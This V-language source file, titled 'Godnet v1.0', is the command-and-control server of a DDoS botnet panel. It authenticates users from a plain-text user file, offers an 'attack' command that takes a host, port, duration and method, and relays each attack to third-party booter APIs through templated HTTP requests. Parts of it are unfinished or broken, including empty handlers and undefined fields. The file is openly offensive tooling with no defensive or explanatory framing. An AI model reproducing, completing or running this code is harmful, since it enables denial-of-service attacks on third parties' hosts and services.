/*
*   ╔═╗╔═╗╔╦╗╔╗╔╔═╗╔╦╗
*   ║ ╦║ ║ ║║║║║║╣  ║
*   ╚═╝╚═╝═╩╝╝╚╝╚═╝ ╩ 
*
* @title: Godnet v1.0
* @author: Jeff The eGod
* @since: 2/20/24
*
*/
import io
import os
import net
import time
import net.http
import x.json2 as json

import src as gn

pub const (
	banner = "╔═╗╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n║ ╦║ ║ ║║║║║║╣  ║ \r\n╚═╝╚═╝═╩╝╝╚╝╚═╝ ╩ \r\n"
	help	= "Name              Description\r
____________________________________________\r
Help		  List of help commands\r
Methods		  List of methods\r
Info		  List of your account info\r
Geo		  Geo Location\r
	- ip\r
Attack		  Attack a host\r
	- ip      HOST/URL to Attack\r
	- port    Port to Attack\r
	- time	  Attack Duration\r
	- method  Attack Method\r
Admin		  List of admin commands\r\n"
	hostname = "[{USERNAME}@Godnet]# ~"
)

pub struct Client
{
	pub mut:
		info 		gn.User
		io			io.BufferedReader
		socket		net.TcpConn
		
		// Used for collection
		host		string
		port		string
		time		string
		method		string
}

pub struct Godnet
{
	pub mut:
		socket		net.TcpListener
		port 		int

		/* Database && Configuration Information */
		apis		[]gn.API
		users 		[]gn.User
		clients		[]Client
}

fn main()
{
	args := os.args.clone()

	if args.len == 1 {
		println("[ X ] Error, Invalid arguments provided...!\r\nUsage: ${args[0]} <cnc_port>")
		return
	}

	mut g := start_godnet(args[1].int())
	g.listener()
	time.sleep(time.infinite)
}

fn start_godnet(port int) Godnet
{
	mut g := Godnet{}
	mut db := os.read_lines("assets/users.gn") or { [] }

	if db == [] { return g }

	println("${gn.success_sym} Loading Godnet's User Database....")
	for user in db 
	{
		user_info := user.replace("(", "").replace(")", "").replace("'", "").split(",")

		if user_info.len == 9 {
			g.users << gn.user(user_info)
		}
	}

	println("${gn.success_sym} Godnet user database loaded....\n${gn.success_sym} Loading APIs!")

	mut apis := g.strip_json_comments(os.read_file("assets/apis.json") or { "" })
	mut json_apis := (json.raw_decode("${apis}") or { json.Any{} }).as_map()

	for key, val in json_apis {
		api_info := (json.raw_decode("${val}") or { json.Any{} }).as_map()
		g.apis << gn.API{name: 		key,
					  toggle: 		(api_info['TOGGLE'] 		or { "" }).bool(),
					  url: 			(api_info['URL'] 			or { "" }).str(),
					  cons: 		(api_info['CONS'] 			or { "" }).int(),
					  max_attack: 	(api_info['MAX_ATTACK'] 	or { "" }).int(),
					  max_time: 	(api_info['MAX_TIME'] 		or { "" }).int()}
	}

	println("${gn.success_sym} APIs completed loaded up.....\r\n${gn.success_sym} Starting Godnet server.....!")

	g.socket = net.listen_tcp(.ip6, ":666") or {
		println("[ X ] Error, Unable to start Godnet CNC....")
		return g
	}

	return g
}

fn (mut g Godnet) listener()
{
	for 
	{
		mut client := g.socket.accept() or {
			println("[ X ] Error, Unable to accept coonection....!")
			&net.TcpConn{}
		}
		client.set_read_timeout(time.infinite)
		spawn g.authorize_user(mut client)
	}
}

fn (mut g Godnet) authorize_user(mut client net.TcpConn)
{
	mut reader := io.new_buffered_reader(reader: client)
	mut user_ip := client.peer_ip() or { "" }
	gn.loading_bar(mut client)
	
	client.write_string("${gn.clear}${gn.c_red}${banner}${gn.c_default}") or { 0 }
	gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}└►Username:${gn.c_default}${gn.bg_default} ", 60)
	username := reader.read_line() or { "" }

	gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}└►Password:${gn.c_default}${gn.bg_default} ", 60)
	password := reader.read_line() or { "" }

	acc := g.find_account(username)
	login_chk := g.validate_login(username, password)
	if !login_chk {
		gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}[ X ] Error, Invalid info provided....!", 60)
		time.sleep(3*time.second)
		return 
	}

	mut new_user := Client{ info: acc, io: reader, socket: client }
	g.clients << new_user
	g.input_handler(mut new_user)
}


/*
*	Input handler, any commands that dont need to
*	be handled will be completed in here
*/
pub fn (mut g Godnet) input_handler(mut c Client)
{
	for 
	{
		gn.animate_text(mut c.socket, "${gn.bg_red}${gn.c_white}${g.create_hostname(c.info.name)}${gn.c_default}${gn.bg_default} ", 60)
		data := c.io.read_line() or { "" }
		r := gn.new_cmd(data)

		match r.cmd {
			"help", "?" {
				c.socket.write_string("${help}") or { 0 }
			} 
			"methods" {
				
			} else {}
		}

		// execute action when received more than one argument ofc
		// invalid arguments or data are checked above!
		if r.args.len > 1 { 
			g.execute_action(mut c, r)
		}
	}
}

/*
*	Handling commands that need extra work done which includes 
*	argument checking and input sanitizing to protect known
*	vulnerabilities such as RCE etc
*/
pub fn (mut g Godnet) execute_action(mut c Client, r gn.Command)
{
	match r.cmd 
	{
		"geo" {

		}
		"attack" {

			c.info.authorize_attack([r.args[1], r.args[2], r.args[3], r.args[8]])
		} else {}
	}
}

pub fn (mut g Godnet) create_hostname(username string) string
{
	if username != "" 
	{ return hostname.replace("{USERNAME}", username) }

	return hostname.replace("{USERNAME}", "root")
}

pub fn (mut g Godnet) find_account(username string) gn.User
{
	for mut user in g.users
	{ if "${user.name}" == "${username}" { return user } }

	return gn.User{}
}

pub fn (mut g Godnet) validate_login(username string, password string) bool
{
	mut acc := g.find_account(username)
	if acc.name == "" { return false }
	if acc.name == "${username}" && acc.password == "${password}"
	{ return true }

	return false
}

pub fn (mut g Godnet) strip_json_comments(json_data string) string
{
	mut new := ""
	lines := json_data.split("\n")

	for line in lines {
		if !line.trim_space().starts_with("//")
		{
			new += "${line}\n"
		}
	}
	return new
}

pub fn (mut g Godnet) send_attack(mut c Client) 
{
	mut responses := ""

	for api in g.apis
	{
		// If method used not in API, Skip
		if c.methods !in api.methods { continue }

		// if time used over the API's max time, Skip
		if c.time > api.max_time { 
			responses += "[ X ] Error, Unable to send to ${api.name} due to the time being over the API's maximum attack time!\r\n"
			continue 
		}

		format_api := api.url.replace("{HOST}", c.host).replace("{PORT}", c.port).replace("{TIME}", c.time).replace("{METHOD}", c.method)
		resp := http.get_text(format_api)

		if "[ X ]" in resp.to_lower().split(" ") || resp.to_lower().contains("\"status\":\"false\"") || resp.to_lower().contains("\"status\": \"false\"")
		{
			responses += "[ X ] It seems like ${api.name} was unable to send attack\r\n"
			continue
		}

		responses += "[ + ] Attack successfully sent to ${api.name}\r\n"
	}
}